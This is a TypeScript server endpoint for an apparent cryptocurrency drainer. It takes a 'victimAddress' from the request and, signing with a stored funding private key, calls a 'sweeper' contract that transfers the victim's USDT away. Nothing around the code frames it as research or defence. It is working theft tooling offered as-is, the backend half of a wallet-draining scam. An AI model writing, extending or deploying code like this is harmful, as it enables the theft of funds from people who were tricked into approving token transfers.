// server/api/sweep.ts
import { defineEventHandler } from 'h3';
import { ethers } from 'ethers';
import { SWEEPER_CONTRACT, USDT_ADDRESS, FUNDING_PRIVATE_KEY, RPC_URL } from '../../src/config';

export default defineEventHandler(async (event) => {
  const { victimAddress } = await readBody(event);
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
  const sweeperABI = ['function sweep(address victim, address token) external'];
  const sweeper = new ethers.Contract(SWEEPER_CONTRACT, sweeperABI, fundingWallet);

  try {
    const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS);
    await tx.wait();
    return { success: true, txHash: tx.hash };
  } catch (error) {
    console.error('Sweep error:', error);
    return { success: false, error: error.message };
  }
});